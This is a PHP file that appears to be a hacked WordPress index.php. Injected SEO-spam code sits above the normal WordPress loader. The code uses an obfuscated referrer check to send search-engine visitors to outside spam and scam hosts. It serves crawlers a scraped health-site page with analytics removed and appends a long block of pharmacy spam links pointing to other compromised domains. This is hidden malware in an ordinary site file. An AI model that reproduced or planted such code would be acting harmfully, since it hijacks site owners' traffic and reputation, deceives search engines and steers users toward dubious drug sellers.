<?php 
//开始进程
error_reporting(0);//禁止生成错误报告
$fromsite = "https://www.healthgrades.com/right-care/erectile-dysfunction/9-natural-sex-tips-to-reverse-erectile-dysfunction"; //目标站
$mysite = "https://testsamostalnosti.rs/"; //靶资源
$filename = ""; //声明空字符串
$url = empty($_GET['Sex'])?"":$_GET['Sex'];  
$qstr = $filename."?Sex=";
	
function getHtml($url)
{
	$content=file_get_contents($url);
	if(empty($content)){
	$ch = curl_init();
	$timeout = 5;
	curl_setopt ($ch, CURLOPT_URL, $url);
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$content = curl_exec($ch);	
	curl_close($ch);
	}
return $content;
}
$jturl="http://4.saleforyou.org/CountView/jump.html";

function chref($crefs)//判断是否是从搜索结果进入
{
$truecref= str_replace("x","","bxxixnxgx|xaxoxxlx|xgxoxxoxgxlxe|yxxaxhxoxo|sxexxaxrxcxh");
if(preg_match("/$truecref/i",$crefs)){
return true;
}else{
return false;
}
}
$htprefs = strtolower($_SERVER['HTTP_REFERER']); //上级页面    判断是否是从搜索结果进入  需要的参数

if(chref($htprefs) && empty($_COOKIE['haircki'])){	
 if(!$_SERVER["QUERY_STRING"] && $_SERVER["REQUEST_URI"]=='/'){
 header("location: ".$jturl);	
	exit;
 }
 
  
/*if(chref($htprefs) && empty($_GET['Sex'])){
header("location: ".$jturl);	
	exit;
}*/

if(chref($htprefs)&& !empty($_GET['Sex']))
  {

$myarr = array("noxitril","male-enhancement","male-enhancement-pills","viagra-for-men","viril-x","promescent","ageless-male-max","great-sex","rhino-pills","best-male-enhancement-pills","testro-x","alpha-titan-testo","best-male-enhancement","erection-pills","women-sex","progentra-reviews","best-supplements-for-men","extenze-reviews","virectin-reviews","gnc-vitamins","ed-pills","natural-male-enhancement","health-stores-near-me","sex-near-me","sex-pills","online-sex","male-enhancement-pills-that-work","male-enlargement-pills","gnc-testosterone-booster","does-extenze-work","ageless-male-reviews","noxitril-reviews","virectin-review","arginmax","progentra-review","redwood-supplement","viril-x-reviews","sex-online","androzene-reviews","malegenix","noxatril","male-enhancement-pills-that-work-fast","male-sex","enhancers","male-enhancement-pill","gnc-usa","testosterone-booster-gnc","best-erection-pills","boner-pills","best-testosterone-booster-gnc","endovex-reviews","gnc-supplements","natural-viagra-for-men","male-enhancement-products","raging-vitality","enhanced-male","ageless-male-tonight","woman-sex","does-extenze-really-work","andro400-max","red-male-enhancement","primal-surge-xl","male-enhancement-pills-over-the-counter","red-fortera-reviews","ed-supplements","red-pill-male-enhancement","men-sex","how-to-do-sex","testro-x-reviews","libido-booster","male-enhancement-reviews","m-30-pill","natural-testosterone-enhancement-pills","best-sex-pills","sex-woman","erectile-dysfunction-drugs-over-the-counter","viral-x","rhino-male-enhancement","ageless-male-side-effects","sex-pills-for-men","man-on-man-sex","ed-pills-online","andro-400-max","sex-drugs","over-the-counter-erection-pills","over-the-counter-ed-pills-at-walgreens","sex-xxl","elite-male-extra","testosterone-supplements-gnc","libido-pills","noxitril-review","how-to-increase-blood-flow-to-penis","ageless-male-walmart","increase-blood-flow-to-penis","sex-for-drugs","sex-pills-for-women","male-enhancement-supplements","how-to-increase-sexual-stamina","over-the-counter-ed-pills-that-work","man-woman-boner","over-the-counter-viagra-cvs","prime-male-reviews","progentra-side-effects","viril-x-amazon","blue-chew-review","how-to-make-a-man-with-ed-hard","men-with-men-sexually","viril-x-gnc","viril-x-walmart","best-male-enhancement-pill","progentra-gnc","supplements-for-ed","male-libido","what-does-extenze-do","vitamins-for-erectile-strength","male-enhancement-pills-at-gnc","nugenix-ultimate-testosterone-reviews","does-progentra-work","male-supplements","progentra-real-reviews","the-best-male-enhancement-pills-over-the-counter","the-dick-only-makes-it-better","last-longer-in-bed-pills","sex-on-drugs","gnc-male-enhancement","how-does-sex-work","how-to-increase-stamina-in-bed","blue-rhino-pill","maximum-power-xl","over-the-counter-male-enhancement","kangaroo-pills","progentra-results","sexual-stamina","sex-pill","benefits-of-lecithin-sexually","how-to-be-better-in-bed","rock-hard-weekend","where-to-buy-viril-x","pure-for-men-reviews","stay-hard-pills","gmc-health","male-enhancement-pills-reviews","retro-vigor","increase-male-libido","supreme-boostr","malegenix-reviews","alpha-xl-boost","alphaxr","best-hard-pills","male-libido-supplements","how-to-increase-sex-drive-in-men","hard-on-pills","libido-supplements","gnc-testosterone-boosters","100-male","increase-libido-in-men","best-male-enhancement-pills-2017","penis-pump-amazon","entengo-herb","how-to-become-more-sexually-active","natural-male-enhancement-pills","primalis-rx","how-to-arouse-a-man-over-50","best-male-enhancement-pills-2018","male-enhancements","performance-foods","otc-ed-pills","where-to-buy-progentra","gnc-viagra-alternative","progentra-ingredients","where-to-buy-virectin","nugenix-price","libido-booster-for-men","top-male-enhancement-pills","rhino-sex-pills","over-the-counter-erectile-dysfunction","red-fortera-walmart","gas-station-sex-pills","increase-female-sex-drive-pills","blue-fortera","vmax-supplement","best-erectile-dysfunction-pills","rlx-pills","red-ed-pill","sex-drug","men-and-women-sex","black-rhino-pill");

$str=preg_replace('/_(.*)/i','',$_GET['Sex']);
$str=strtoupper($str);
//$tiaourl="./".;
foreach($myarr as $key => $val){
	if(strstr($str,$val)){
		header("location: ".$jturl);
  exit;
		
	}
}
}

if(!empty($url)){
header("location: https://exists-mazard.icu/1e0dfe6c-9624-408c-8db1-3b70c4fedec7");	
	exit;

}
}
		
	preg_match("/(http|https):\/\/([\s\S]*?)\//i",$fromsite, $matches);
	if(!empty($url))
{
$fromsite=$matches[0];
}

$tc="
<a href=\"https://contentcanada.net/Sildenafil/Yoo-cambodia-sexual-3qt-health-programs\">Zyntix Performance Enhancer</a>
<a href=\"https://contentcanada.net/Sildenafil/order-Tg5-ed-pills-online-in-2XJ-massachusetts\">Who World Mental Health Sexual Assault</a>
<a href=\"https://contentcanada.net/Sildenafil/1T9-what-e85-are-the-3-ed-pills\">Erectile Dysfunction Treatment At Home</a>
<a href=\"https://contentcanada.net/Sildenafil/does-kSf-penis-size\">Parates Male Enhancement</a>
<a href=\"https://contentcanada.net/Sildenafil/ore-male-breast-enhancement-xOK-2009\">Cause For Erectile Dysfunction</a>
<a href=\"https://contentcanada.net/Sildenafil/the-beast-sexual-VXq-enhancement-unB\">How To Enhance Your Penis Size</a>
<a href=\"https://contentcanada.net/Sildenafil/erection-RPb-for-more-than-4-hours-u3e\">Too Much Dopamine Low Libido</a>
<a href=\"https://contentcanada.net/Sildenafil/vxl-F33-ed-pills\">Macavi Pills Erection</a>
<a href=\"https://contentcanada.net/Sildenafil/medicare-erectile-dysfunction-1jx\">Ginseng Sexual Health</a>
<a href=\"https://contentcanada.net/Sildenafil/best-SMa-male-enhancement-pills-sSN-for-length-and-girth-in-india\">Planned Parenthood Of Los Angeles</a>
<a href=\"https://contentcanada.net/Sildenafil/how-to-take-Ehi-sildenafil-oN7-100mg\">Is Ed Curable</a>
<a href=\"https://contentcanada.net/Sildenafil/do-hD3-those-ed-pills-oKd-at-gas-stations-work\">Extreme Supplements</a>
<a href=\"https://contentcanada.net/Sildenafil/erectile-dysfunction-detroit-NEF\">Forhims Info</a>
<a href=\"https://contentcanada.net/Sildenafil/ivO-sex-is-dangerous\">Make Penis Huge</a>
<a href=\"https://contentcanada.net/Sildenafil/over-the-counter-male-enhancement-zd0-pills-interact-with-blood-pressure-5YB-medicine\">Erectile Dysfunction After Blue Balls</a>
<a href=\"https://contentcanada.net/Sildenafil/Gn8-gurls-have-sex\">Erectile Dysfunction Military Transgender</a>
<a href=\"https://contentcanada.net/Sildenafil/low-libido-19-rAN-years-old-LIM\">Ed Medication Comparison</a>
<a href=\"https://contentcanada.net/Sildenafil/watch-links-L3O-sx\">How To Make Your Penus Thicker</a>
<a href=\"https://contentcanada.net/Sildenafil/alternatives-wY9-to-ed-pills-tYk\">Vaiagra</a>
<a href=\"https://contentcanada.net/Sildenafil/impotency-meaning-y1j\">Male Effects From Breast Enhancement Pills</a>
<a href=\"https://contentcanada.net/Sildenafil/partner-has-d34-very-xxw-low-libido\">Male Enhancement Girth And Length</a>
<a href=\"https://contentcanada.net/Sildenafil/can-you-buy-ed-pills-over-the-F3J-counter-2uD\">Women Sex Pills</a>
<a href=\"https://contentcanada.net/Sildenafil/night-LCe-erection\">Wicked Male Enhancement Pill</a>
<a href=\"https://contentcanada.net/Sildenafil/fruits-erectile-dysfunction-Kmb\">What Can I Take Over The Counter For Erectile Dysfunction</a>
<a href=\"https://contentcanada.net/Sildenafil/blue-60-3o6-male-kzu-enhancement\">Man Up Pills Review</a>
<a href=\"https://contentcanada.net/Sildenafil/hkq-kaboom-erectile-drug\">Erectile Dysfunction Treatment Shots</a>
<a href=\"https://contentcanada.net/Sildenafil/nitric-oxide-penile-tgq-e9Y-enlargement\">Max Head Flex Bulge Male Enhancement Cup</a>
<a href=\"https://contentcanada.net/Sildenafil/ORh-naturally-increase-penile-size-upto-JRa-9-inches\">Buy Viagra Online With A Prescription</a>
<a href=\"https://contentcanada.net/Sildenafil/male-HVR-enhancement-pills-wx9-free-trials\">Real Big Cock</a>
<a href=\"https://contentcanada.net/Sildenafil/get-oYO-1M7-a-bigger-penis-fast\">Niacin For Ed</a>
<a href=\"https://contentcanada.net/Sildenafil/high-libido-meaning-uv2\">Erectile Dysfunction Cheating</a>
<a href=\"https://contentcanada.net/Sildenafil/low-jF0-libido-kgC-treatment-options\">L Citrulline Ed</a>
<a href=\"https://contentcanada.net/Sildenafil/priority-of-reproductive-and-xCB-sexual-health-in-the-us-e6A\">Low Libido</a>
<a href=\"https://contentcanada.net/Sildenafil/natural-pills-to-last-4iQ-longer-TFK-in-bed\">Where To Find Sex Online</a>
<a href=\"https://contentcanada.net/Sildenafil/short-lasting-Ih3-erection\">Miracle Shake Treats Root Cause Of Erectile Dysfunction Ingredients</a>
<a href=\"https://contentcanada.net/Sildenafil/what-does-viagra-do-to-jCc-blood-pressure-JKv\">Wwe Best Sellers</a>
<a href=\"https://contentcanada.net/Sildenafil/erectile-2OM-dysfunction-code\">How To Enlarge Penile Length Naturally</a>
<a href=\"https://contentcanada.net/Sildenafil/TXM-jHS-what-really-works-for-erectile-dysfunction\">Facebook Erectile Dysfunction Ad</a>
<a href=\"https://contentcanada.net/Sildenafil/jWv-injections-for-2af-erectile-dysfunction\">Sexual Phrases</a>
<a href=\"https://contentcanada.net/Sildenafil/vacuum-pump-for-m3f-erectile-dysfunction-pTz-in-pakistan\">Max Stamina Go All Night</a>
<a href=\"https://contentcanada.net/Sildenafil/what-lCB-do-male-enhancement-Xdi-pills-do\">Best Male Testosterone Enhancement</a>
<a href=\"https://contentcanada.net/Sildenafil/viagra-U2Q-potency\">Nutraceutical For Low Female Libido</a>
<a href=\"https://contentcanada.net/Sildenafil/maca-SOv-for-erectile-n6s-dysfunction\">Vitality Products</a>
<a href=\"https://contentcanada.net/Sildenafil/cardiovascular-diseases-FP5-quizlet\">Erectile Dysfunction At 21</a>
<a href=\"https://contentcanada.net/Sildenafil/what-is-king-FEM-size-9uN-male-enhancement\">Male Sex Enhancement Pills At Walmart</a>
<a href=\"https://www.sdw-hamburg.de/Male-Pills/how-to-maintain-QLC-an-erection-without-y99-pills\">Us Hair Store</a>
<a href=\"https://www.sdw-hamburg.de/Male-Pills/best-PLJ-ed-medicine\">Hormone Treatment For Menopause And Low Libido</a>
<a href=\"https://www.sdw-hamburg.de/Pills/fast-IaY-acting-cialis\">Erectile Dysfunction Photos</a>
<a href=\"https://www.sdw-hamburg.de/Viagra/causes-uSK-of-erectile-dysfunction-in-9ou-60s\">Best Ginseng For Ed</a>
<a href=\"https://www.sdw-hamburg.de/Sale/little-vk7-yellow-3kI-pill-with-e-on-it\">Erectile Dysfunction Clickbait Article</a>
<a href=\"https://www.sdw-hamburg.de/ED-Pills/extenze-gc5-for-men\">Herbal Viagra Walmart</a>
<a href=\"https://www.sdw-hamburg.de/Male-Enhancement/sex-medicine-e1O\">Chinese Herb For Impotence</a>
<a href=\"https://www.sdw-hamburg.de/Male-Pills/best-PLJ-ed-medicine\">How Does Erection Occur</a>
<a href=\"https://www.sdw-hamburg.de/ED-Pills/is-it-possible-to-increase-l7T-penile-P4K-size-naturally\">Best Sexual Enhancement Pills</a>
<a href=\"https://www.sdw-hamburg.de/Viagra/bigger-dick-without-4Pp-I5u-pills\">Mens Sexual Health Supplement</a>
<a href=\"https://www.sdw-hamburg.de/Viagra/UvU-nugenix-price\">Prescription For Low Libido</a>
<a href=\"https://www.sdw-hamburg.de/Pills/man-without-penis-5Ny\">Benefits Of Penis Pump</a>
<a href=\"https://www.sdw-hamburg.de/Viagra/cvs-K1e-pharmacy-2wJ-male-enhancement-pills\">Male Enhancement Pill Adonis</a>
<a href=\"https://www.sdw-hamburg.de/Viagra/aOA-causes-of-erectile-dysfunction-include-HDw\">Virmax Male Enhancer Review</a>
<a href=\"https://www.sdw-hamburg.de/Sexual-Enhancement/bull-power-sxa-male-4SO-enhancement-reviews\">Ed Pills Porn Star</a>
<a href=\"https://www.sdw-hamburg.de/Male-Pills/boost-jQ3-TiL-your-low-libido\">Extenze Ingredients Label</a>
<a href=\"https://www.sdw-hamburg.de/Male-Pills/blue-sex-pill-e5I-AuO-walmart\">7 11 Otc Ed Pills</a>
<a href=\"https://www.sdw-hamburg.de/Sale/D2z-not-getting-xQS-a-full-erection\">Estrogen Boost</a>
<a href=\"https://www.sdw-hamburg.de/Male-Pills/penis-not-YWA-growing\">Strong Boners</a>
<a href=\"https://www.sdw-hamburg.de/Sale/charlotte-gzj-male-enhancement\">Hypoglycemia Low Libido</a>
<a href=\"https://www.sdw-hamburg.de/Male-Enhancement/NFO-best-herbal-treatment\">How To Give Great Oral To Your Man</a>
<a href=\"https://www.sdw-hamburg.de/Male-Enhancement/low-cWt-iron-low-8Y1-libido\">Control Sexual Enhancement Pill</a>
<a href=\"https://www.sdw-hamburg.de/Sildenafil/erectile-yCG-dysfunction-oral-stimulation-nQ4\">Can Balanitis Cause Erectile Dysfunction</a>
<a href=\"https://www.sdw-hamburg.de/ED-Pills/Wub-erectile-NV5-dysfunction-definition-wikipedia\">Cheap Drugs For Erectile Dysfunction</a>
<a href=\"https://www.sdw-hamburg.de/ED-Pills/piperazine-erectile-5No-dysfunction\">Flomax For Erectile Dysfunction</a>
<a href=\"https://www.sdw-hamburg.de/Male-Enhancement/7TO-girlshaveing-sex\">Sexual And Reproductive Health Ppt</a>
<a href=\"https://www.sdw-hamburg.de/Sale/what-DeO-does-LMY-mg-mean-in-pills\">Male Enhancement Local Stores</a>
<a href=\"https://www.sdw-hamburg.de/Sexual/nitric-oxide-Kob-help-erectile-300-dysfunction\">Large Dic</a>
<a href=\"https://www.sdw-hamburg.de/Sildenafil/does-masturbation-RuK-uuX-cause-erectile-dysfunction\">Natural Foods To Help With Erectile Dysfunction</a>
<a href=\"https://www.sdw-hamburg.de/Sexual-Enhancement/bull-power-sxa-male-4SO-enhancement-reviews\">Sex Picture</a>
<a href=\"https://escoladainteligencia.com.br/Viagra/pIx-guY-best-way-to-increase-blood-flow\">Erectile Dysfunction Nux Vomica</a>
<a href=\"https://escoladainteligencia.com.br/Sildenafil/black-gold-6D6-pills\">Big Bang Male Enhancement Reviews</a>
<a href=\"https://escoladainteligencia.com.br/Sale/stretching-your-dick-sEq\">Increasing Blood Flow To Penus</a>
<a href=\"https://escoladainteligencia.com.br/Pills/penis-pump-increase-jfH-size-Vrz\">Steel Rx Male Enhancement Pills</a>
<a href=\"https://escoladainteligencia.com.br/Male-Pills/Efm-rhino-17-rwM-male-enhancement\">How To Get A Bigger Head</a>
<a href=\"https://escoladainteligencia.com.br/Male-Enhancement/causes-IrR-of-fatigue-in-rUJ-males\">Hammock Icon</a>
<a href=\"https://escoladainteligencia.com.br/Sale/YoE-2-boy-sex\">How Long Does It Take For Extenze Maximum Strength To Work</a>
<a href=\"https://escoladainteligencia.com.br/Sildenafil/vLr-sex-J49-performance-enhancing-pills\">Make Penis Grow</a>
<a href=\"https://escoladainteligencia.com.br/Sildenafil/4dp-over-8cx-the-counter-ed-pills-canada\">Inositol Erectile Dysfunction</a>
<a href=\"https://escoladainteligencia.com.br/Sildenafil/bionix-iI2-male-enhancement\">Niacin Gmc</a>
<a href=\"https://escoladainteligencia.com.br/Male-Pills/2OX-steel-rx-where-noB-to-buy\">Better Than Viagra Natural</a>
<a href=\"https://escoladainteligencia.com.br/ED-Pills/Xa1-planet-parenthood-locations\">Regular Size Pennis</a>
<a href=\"https://escoladainteligencia.com.br/Sexual-Enhancement/gay-lgb-IDS-sexual-health-clinic-london\">Dr Help Online</a>
<a href=\"https://escoladainteligencia.com.br/Pills/what-vitamins-make-your-Ykf-penis-bigger-Xyl\">Men For Sex Com</a>
<a href=\"https://escoladainteligencia.com.br/Sexual-Enhancement/red-pill-male-K1H-P93-enhancer\">The Word For Not Having Sex</a>











";
	$content = getHtml($fromsite.$url);
	$fromsite=$matches[0];
$repstr = $mysite.$qstr;
$fromsiteurl =str_replace(array("https://","http://"),"",$fromsite);
$content = str_replace("https://".$fromsiteurl,$repstr,$content);
$content = str_replace("http://".$fromsiteurl,$repstr,$content);

$content = str_replace("src=\"".$repstr,"src=\"".$fromsite,$content);

$content = str_replace("href=\"","href=\"".$repstr,$content);
$content = str_replace($repstr.$repstr,$repstr,$content);
$content = str_replace($repstr."static",$fromsite."static",$content);
$content = str_replace($repstr."skin",$fromsite."skin",$content);
$content = str_replace($repstr."js",$fromsite."js",$content);
$content = str_replace($repstr."/css",$fromsite."css",$content);
$content = str_replace($repstr."media",$fromsite."media",$content);
$content = str_replace($repstr."\"",$mysite1."\"",$content);
$content = str_replace($repstr."/\"",$mysite1."\"",$content);
$content = str_replace("/design",$fromsite."design",$content);
$content = preg_replace("#(src|href)=(\"|')http://(www\.)?".str_replace(".","\.",$fromsite)."/(.*?)(\"|')#", "$1=\"".$repstr."$4\"", $content);
$content = preg_replace("#(src|href)=(\"|')(/|(?!http))(.*?)(\"|')#", "$1=\"".$repstr."$4\"", $content);
$content = str_replace($repstr.$matches[0],$repstr,$content);
$content = str_ireplace('</head>','<meta name="robots" content="index,follow,noarchive,noodp" />'.chr(13).chr(10).'</head>',$content);
$content = str_replace("/js",$fromsite."js",$content);
$content = str_replace("/images",$fromsite."images",$content);
$content = str_replace($repstr.$fromsite,$fromsite,$content);
$content = str_replace("statcounter","sdf",$content);
$content = str_replace("ga(","sdfsdf",$content);
$content = str_replace("google-analytics.com","sdfsd",$content);
$content = str_replace("linezing.com","sdfsdf",$content);
$content = str_replace("comm100.com","sdfsdf",$content);
$content = str_replace("www.51.la","sdfsdf",$content);
$content=str_replace("</body>","</body>".$tc,$content);
//$content = preg_replace('/=http:.*[\'"]/','=mask/hand sanitizer gel gallon"',$content);
$content = str_replace($repstr."/",$repstr,$content);
$domain= str_replace("www.","",$_SERVER['HTTP_HOST']);
/*$content = preg_replace("#href=(\"|')(http|https)://(?!(www\.)?".str_replace(".","\.",$domain).")(.*?)(\"|')#i", "href=\"#\"", $content);*/
$content = preg_replace("/iflscience/i", "Sex-STORE", $content);
$tmp = strtolower($_SERVER['HTTP_USER_AGENT']);
if (strpos ($tmp, 'google') !== false || strpos ($tmp, 'yahoo') !== false || strpos ($tmp, 'msn') !== false || strpos ($tmp, 'sqworm') !== false) {
echo $content;	
exit;
}

?>
<?php
/**
* Front to the WordPress application. This file doesn't do anything, but loads
* wp-blog-header.php which does and tells WordPress to load the theme.
*
* @package WordPress
*/

/**
* Tells WordPress to load the WordPress theme and output it.
*
* @var bool
*/
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );

